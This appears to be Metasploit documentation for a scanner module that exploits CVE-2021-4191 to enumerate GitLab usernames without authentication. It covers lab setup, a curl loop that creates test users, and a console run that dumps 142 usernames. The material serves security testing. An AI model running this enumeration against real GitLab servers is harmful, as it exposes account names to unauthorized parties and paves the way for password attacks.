## Vulnerable Application

### Description

This module queries the GitLab GraphQL API without authentication to acquire the list of
GitLab users (CVE-2021-4191). The module works on all GitLab versions from 13.0 up to
14.8.2, 14.7.4, and 14.6.5.

Exploitation will result in acquiring a list of valid GitLab usernames.

### Installation

#### GitLab 13.10.2 on Ubuntu 20.04.2 x64

* Download [GitLab 13.10.2](https://packages.gitlab.com/gitlab/gitlab-ce/packages/ubuntu/focal/gitlab-ce_13.10.2-ce.0_amd64.deb)
* Install openssh-server (`sudo apt install openssh-server`)
* Install GitLab (`sudo dpkg -i gitlab-ce_13.10.2-ce.0_amd64.deb`)
* Modify the `external_url` in `/etc/gitlab/gitlab.rb` to something like `external_url http://localhost`
* Run `sudo gitlab-ctl reconfigure`
* Done!

To add a lot of users try something like this:

```
$ set -B
$ for i in {50..250}; do
curl -vv -X POST "http://10.0.0.6/api/v4/users?private_token=TOKEN&email=test$i@test.com&username=test$i&name=test$i&reset_password=True"
done
```

That should create 200 users with names such as "test50", "test51", etc.

## Verification Steps

* Follow the above instructions to install GitLab 13.10.2
* Do: `use auxiliary/scanner/http/gitlab_graphql_user_enum`
* Do: `set RHOST <ip>`
* Do: `run`
* You should get a list of usernames in loot.

## Options

### TARGETURI

Specifies GitLab's base URI. Although an unpopular configuration, GitLab does support use
of a [relative URL](https://docs.gitlab.com/omnibus/settings/configuration.html#configuring-a-relative-url-for-gitlab).

## Scenarios

### GitLab 14.4.1 on Ubuntu 20.04.2 x64. More than 100 users triggers paging logic.

```
msf6 > use auxiliary/scanner/http/gitlab_graphql_user_enum
msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RHOST 10.0.0.13
RHOST => 10.0.0.13
msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RPORT 80
RPORT => 80
msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > run

[+] Enumerated 142 GitLab users
[+] Userlist stored at /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > cat /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
[*] exec: cat /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt

test150
test149
test148
test147
test146
test145
test144
test143
test142
test141
test140
test139
test138
test137
test136
test135
test134
test133
test132
test131
test130
test129
test128
test127
test126
test125
test124
test123
test122
test121
test120
test119
test118
test117
test116
test115
test114
test113
test112
test111
test110
test109
test108
test107
test106
test105
test104
test103
test102
test101
test100
test99
test98
test97
test96
test95
test94
test93
test92
test91
test90
test89
test88
test87
test86
test85
test84
test83
test82
test81
test80
test79
test78
test77
test76
test75
test74
test73
test72
test71
test70
test69
test68
test67
test66
test65
test64
test63
test62
test61
test60
test59
test58
test57
test56
test55
test54
test53
test52
test51
test50
testuser
test39
test35
test34
test33
test32
test31
test30
test29
test28
test27
test26
test25
test24
test23
test22
test21
test20
test18
test19
test17
test16
test15
test14
test13
test12
test11
test10
test9
test8
test7
test6
test5
test4
test3
test2
test1
test
support-bot
alert-bot
root
msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > 
```
